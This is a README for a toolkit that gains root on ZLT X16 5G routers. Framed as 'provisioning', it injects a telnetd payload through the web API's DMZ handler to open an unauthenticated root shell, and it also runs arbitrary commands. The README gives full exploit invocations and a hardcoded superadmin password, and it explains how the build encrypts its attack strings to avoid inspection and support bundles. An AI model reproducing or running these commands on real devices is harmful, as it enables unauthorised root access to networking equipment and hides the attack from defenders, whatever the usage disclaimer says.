# zlt-x16-toolkit

Provisioning toolkit for **ZLT X16** 5G CPE (Qualcomm SDX65, SIMCom SIM8260E)
that you own or are authorised to administer.

It talks to the device's own web management API, so it needs nothing but network
access to the target's HTTP port.

> **Authorised use only.** `unlock` changes device state and opens an
> unauthenticated root shell. Running it against equipment you do not own or have
> written permission to administer may be unlawful. Every `unlock` invocation
> requires `--confirm`.

---

## What it does

| Command | Effect |
|---|---|
| `probe` | Reachability, open ports, firmware identity |
| `login` | Verify web credentials and print the privilege tier |
| `verify` | Check whether a passwordless shell is already exposed (read-only) |
| `unlock` | Install a passwordless root shell via the device's DMZ handler |

Why this works, and the full request/response detail: [docs/protocol.md](docs/protocol.md).

## Install

```bash
git clone <this repo>
cd zlt-x16-toolkit
make test          # Go + Python test suites
make build-enc     # encrypted release build -> dist/zltx16
```

Requires Go 1.22+ (build time only; the binary is static) and Python 3.8+ for the
reference implementation.

## Usage

```bash
# 1. is it there, and what is it?
./dist/zltx16 probe -host 192.168.3.1

# 2. do the credentials work?
./dist/zltx16 login -host 192.168.3.1 -user admin -pass admin

# 3. read-only check: is a passwordless shell already open?
./dist/zltx16 verify -host 192.168.3.1 --ports 23,22

# 4. provision it (opens a root shell on tcp/23)
./dist/zltx16 unlock -host 192.168.3.1 -user admin -pass admin --confirm
```

Higher privilege tiers, or the alternate port when 23 is busy:

```bash
./dist/zltx16 unlock -host 192.168.3.1 -user superadmin -pass 83583000 --confirm
./dist/zltx16 unlock -host 192.168.3.1 --mode telnet-alt --dport 4444 --confirm
```

Run one specific command instead of installing a daemon:

```bash
./dist/zltx16 unlock -host 192.168.3.1 \
  --mode command --cmd 'id > /tmp/.zlt_unlock_marker' --confirm
```

The Python twin exposes the same four subcommands:

```bash
python3 python/zltx16_unlock.py probe  -H 192.168.3.1
python3 python/zltx16_unlock.py unlock -H 192.168.3.1 -u admin -p admin --confirm
```

## Exit codes

| Code | Meaning |
|---|---|
| 0 | Success (for `unlock`: shell confirmed) |
| 1 | Reached the device but it refused / verification failed |
| 2 | Refused locally: bad arguments, or `--confirm` missing |

## The encrypted build

`make build-enc` does **not** ship readable strings.

`tools/genseal` re-encrypts the sensitive literals with **AES-256-GCM** under a
fresh random key and rewrites `internal/zlt/sealed_gen.go` with base64
ciphertext only. The values are opened in memory at `init()`. There are no
plaintext fallbacks in the source — if the blobs are unreadable the tool fails
loudly rather than silently using a default.

What ends up sealed:

| Literal | Why |
|---|---|
| CGI path | the request surface |
| telnet payload template | the injection itself |
| default username / password | shipped credentials |
| factory LAN address | default target |
| `NO_AUTH` marker | protocol internals |
| `superadmin` account name | privilege escalation target |

Verify it yourself:

```bash
make verify-enc
```

```
--- literals that MUST be absent from dist/zltx16 ---
  ok     cgi-bin/http.cgi
  ok     busybox telnetd
  ok     NO_AUTH
  ok     192.168.3.1
  ok     superadmin
  ok     telnetd
  ok     RequestCmd
--- control: the plain build must still contain them ---
  ok     plain build leaks as expected
```

**Be clear about what this is.** This is obfuscation, not cryptography. The key
ships inside the binary, so a determined analyst can recover every literal. It
defeats `strings`, `grep`, support bundles and casual inspection — which is the
realistic threat. If you need the tool to be genuinely opaque, the binary must
fetch its configuration from a server you control, and that is a different design.

### `make build-garble` (optional, usually unavailable on macOS)

A stronger option is [garble](https://github.com/burrowers/garble), which
encrypts literals at the compiler level. **It is not the default here because
macOS security software deletes the output.** Observed on this workstation:

- garble 0.18 requires Go ≥ 1.27; the default toolchain was 1.26
- after installing Go 1.27 via `golang.org/dl`, garble builds fine
- but every `-literals` binary is **removed within seconds** of being written,
  for `darwin/arm64`, `linux/arm64`, `linux/amd64` alike
- the plain `go build` output of the same code survives

Run `make build-garble` on Linux if you want that layer.

## Testing

```bash
make test        # go vet + go test + python unittest
make test-go
make test-py
```

Coverage includes the login token/hash handshake, payload construction and its
input validation, the no-auth probe heuristics (including telnet IAC noise),
sealed-literal round-trips, and the full orchestration flow against a fake
device. Nothing in the test suite touches a real router.

## Layout

```
cmd/zltx16/         CLI entry point
internal/zlt/       client, payload, probe, orchestration
internal/seal/      AES-256-GCM sealing
internal/zlt/sealed_gen.go   generated — do not edit
tools/genseal/      regenerates sealed_gen.go
python/             single-file reference implementation + tests
docs/protocol.md    the reverse-engineered protocol
```

## Caveats

- The target must be reachable on its HTTP port. On a factory ZLT X16 the WAN
  firewall drops tcp 22/80/443, so this works from the **LAN** side.
- If the device already has an unauthenticated `telnetd -l /bin/sh` on 23, the
  injected daemon cannot bind and `unlock` reports "injection sent but no shell
  observed" even though you already have a shell. Run `verify` first.
- Firmware varies by operator SKU. The command numbers and the DMZ `subcmd` were
  confirmed on `X16-OMN247` (Ooredoo Oman). If `subcmd` differs on your build,
  the tool will report a rejection rather than guess.

## License

Internal / private. No warranty. Use at your own risk.
